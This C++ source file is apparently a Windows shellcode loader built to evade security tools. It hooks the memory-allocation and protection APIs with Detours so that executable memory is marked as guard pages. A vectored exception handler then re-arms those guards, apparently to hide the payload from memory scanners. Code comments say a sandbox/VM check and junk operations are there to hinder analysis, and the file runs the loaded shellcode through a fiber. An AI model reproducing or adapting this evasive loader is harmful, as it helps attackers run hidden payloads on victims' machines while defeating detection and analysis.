#include <iostream>
#include "loader.h"
#include "definition.h"
#include <detours.h>
#include "checkVM.h"
#include "helper.h"
#include "hooks.h"

static LPVOID lastGuardAddress = nullptr;

extern HMODULE hNtdll;
extern pZwAllocateVirtualMemory ZwAllocateVirtualMemory;
pZwAllocateVirtualMemory oriZwAllocateVirtualMemory = ZwAllocateVirtualMemory;

NTSTATUS NTAPI myZwAllocateVirtualMemory(
	_In_ HANDLE ProcessHandle,
	_Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize)) PVOID* BaseAddress,
	_In_ ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T RegionSize,
	_In_ ULONG AllocationType,
	_In_ ULONG Protect
) {
	NTSTATUS status = oriZwAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);

	do {
		if (status != 0) {
			break;
		}
		if (ProcessHandle != myGetCurrentProcess()) {
			break;
		}
		if (AllocationType != MEM_COMMIT) {
			break;
		}
		if (Protect != PAGE_EXECUTE_READWRITE) {
			break;
		}

		else
		{
			status = oriZwAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect | PAGE_GUARD);
		}
	} while (false);

	return status;
}

extern pNtProtectVirtualMemory NtProtectVirtualMemory;
pNtProtectVirtualMemory oriNtProtectVirtualMemory = NtProtectVirtualMemory;

NTSTATUS NTAPI myNtProtectVirtualMemory(
	_In_ HANDLE ProcessHandle,
	_Inout_ PVOID* BaseAddress,
	_Inout_ PSIZE_T  RegionSize,
	_In_ ULONG NewProtection,
	_Out_ PULONG OldProtection
) {
	NTSTATUS status = oriNtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtection, OldProtection);

	do {
		if (status != 0) {
			break;
		}
		if (ProcessHandle != myGetCurrentProcess()) {
			break;
		}
		if (NewProtection != PAGE_EXECUTE_READWRITE) {
			break;
		}
		else
		{
			status = oriNtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtection | PAGE_GUARD, OldProtection);
		}
	} while (false);

	return status;
}

static void AddPageGuardProtect(void* addr) {
	DWORD oldProtect;
	MEMORY_BASIC_INFORMATION mbi;
	SYSTEM_INFO sysInfo;
	SIZE_T dwPageSize = NULL;

	GetSystemInfo(&sysInfo);

	extern pNtQueryVirtualMemory myNtQueryVirtualMemory;
	myNtQueryVirtualMemory(myGetCurrentProcess(), addr, MemoryBasicInformation, &mbi, sizeof(MEMORY_BASIC_INFORMATION), NULL);

	if ((mbi.Protect & PAGE_GUARD) != 0) {
		return;
	}
	dwPageSize = sysInfo.dwPageSize;
	NtProtectVirtualMemory(myGetCurrentProcess(), &addr, &dwPageSize, mbi.Protect | PAGE_GUARD, &oldProtect);
}
LONG NTAPI ExceptionCallBack(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_GUARD_PAGE) {
		lastGuardAddress = (LPVOID)ExceptionInfo->ExceptionRecord->ExceptionInformation[1];

		ExceptionInfo->ContextRecord->EFlags |= 0x100;
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	else if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
		if (lastGuardAddress != nullptr) {
			AddPageGuardProtect(lastGuardAddress);
			lastGuardAddress = nullptr;
		}
		return EXCEPTION_CONTINUE_EXECUTION;
	}

	return EXCEPTION_CONTINUE_SEARCH;
}

void VEH_init() {
	AddVectoredExceptionHandler(1, &ExceptionCallBack);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	// 检查是否在虚拟机中 如果是 不初始化VEH 就会异常退出
	if (!query_license_value()) {
		PatchHooks();
		VEH_init();
	}
	else {
		// 做无意义垃圾操作 干扰分析
		doSome();
	}

	DetourTransactionBegin();
	DetourUpdateThread(myGetCurrentThread());
	DetourAttach(&(PVOID&)oriZwAllocateVirtualMemory, myZwAllocateVirtualMemory);
	DetourAttach(&(PVOID&)oriNtProtectVirtualMemory, myNtProtectVirtualMemory);
	DetourTransactionCommit();

	auto shellcode = loadShellcode();

	LPVOID lpMem = NULL;
	ULONG oldProtect = NULL;
	SIZE_T  size = shellcode.size();
	ZwAllocateVirtualMemory(myGetCurrentProcess(), &lpMem, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(lpMem, shellcode.data(), shellcode.size());

	extern pConvertThreadToFiber myConvertThreadToFiber;
	extern pCreateFiber myCreateFiber;
	extern pSwitchToFiber mySwitchToFiber;

	myConvertThreadToFiber(NULL);
	LPVOID lpFiber = myCreateFiber(shellcode.size(), (LPFIBER_START_ROUTINE)lpMem, NULL);
	mySwitchToFiber(lpFiber);

	return 0;
}